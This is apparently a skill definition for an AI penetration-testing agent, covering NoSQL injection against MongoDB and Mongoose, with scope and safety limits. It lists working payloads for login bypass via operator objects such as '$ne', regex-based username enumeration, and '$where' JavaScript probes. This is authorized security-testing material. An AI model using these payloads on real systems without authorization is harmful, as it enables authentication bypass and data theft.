---
slug: nosql-injection
name: NoSQL Injection Testing
description: "NoSQL injection for MongoDB operator injection ($ne, $gt, $regex, $where), Mongoose authentication bypass via operator objects replacing string fields, array-based enumeration, and server-side JS execution via $where. Use when: MongoDB/Mongoose/DynamoDB detected in tech stack, or JSON-accepting auth/query/filter endpoints are present."
phase: validation
compatible_phases:
  - validation
category: vulnerability
required_tools:
  - http_payload
  - report_note
  - report_finding
  - submit_validation_lead_outcome
  - submit_validation_outcome
  - file_read
tool_alternatives: []
risk_tier: standard
use_when: Use when APIs or forms interact with MongoDB-like filters, JSON query bodies, search parameters, login objects, or error messages that suggest NoSQL operators are parsed server-side.
not_when: Do not use for fingerprint-only inventory, out-of-scope targets, missing required preconditions, destructive or full-impact exploitation, or when a more specific primary owner already completed the hypothesis.
required_inputs:
  - Authorized in-scope target or artifact
  - Baseline request, response, browser flow, or source context
  - Applicable identity, state, and quantitative safety limits
expected_outputs:
  - Candidate parameters and payload families tested with baseline/differential responses
  - Confirmed or rejected operator injection, regex abuse, auth bypass, or query manipulation
  - Safety notes proving tests were bounded and non-destructive
evidence_floor: NoSQL injection requires differential evidence that an injected operator changes server-side query semantics or authorization outcome. Error-only behavior is a lead unless impact is proven.
follow_up_triggers:
  - Objective impact is reproducible and needs independent validation
  - A related protocol, platform, or vulnerability owner is required
  - A prerequisite is missing and must be recorded as a blocker
strong_terms:
  - nosql-injection
  - nosql injection
  - mongodb
  - $ne
  - $where
  - operator injection
  - json query
  - nosql
  - injection
tech_triggers:
  - mongodb
  - mongoose
  - dynamodb
  - firebase
  - couchdb
ntype_triggers:
  - http.endpoint
  - tech.fingerprint
technique_ids:
  - B1:nosql-injection
  - PS-NOSQL
source_modes:
  - blackbox
  - greybox
  - whitebox
related_skills:
  - validation
handoff_skills:
  - validation
mutation_applicability: applicable
supporting_files:
  - examples.md
  - fixtures/manifest.yaml
  - methodology.md
  - mutation-algebra.md
fixture_manifest: fixtures/manifest.yaml
---
# NoSQL Injection Testing

## Attack Surface
MongoDB query operators accepted in JSON bodies, authentication endpoints using
`findOne({username, password})` patterns, array operators on filter params, and
`$where` server-side JavaScript evaluation.

## Discovery Methodology
1. Replace string field values with operator objects: `{"username": {"$ne": ""}}` on login.
2. Test `$regex` for data enumeration: `{"username": {"$regex": "^admin"}}`.
3. Probe `$where` with JS: `{"$where": "this.password.match(/.*/)"}`.
4. Test form-encoded variants: `username[$ne]=invalid&password[$ne]=invalid`.
5. For DynamoDB/Firebase: probe filter expression injection and Firestore rule evaluation edge cases.

## Mutation Algebra
- `$ne`: `{"field": {"$ne": ""}}` — matches any document where field is not empty
- `$gt`: `{"field": {"$gt": ""}}` — matches any non-empty string field
- `$regex`: `{"field": {"$regex": ".*"}}` — matches everything; use `^X` for enumeration
- `$where`: `{"$where": "this.role=='admin'"}` — JS eval in query context
- Form-encoded: `field[$ne]=x`, `field[$gt]=`, `field[$in][]=admin`

## Validation
Confirm with successful login response (session/token returned) despite no matching
password, or data enumeration returning documents outside the expected scope.
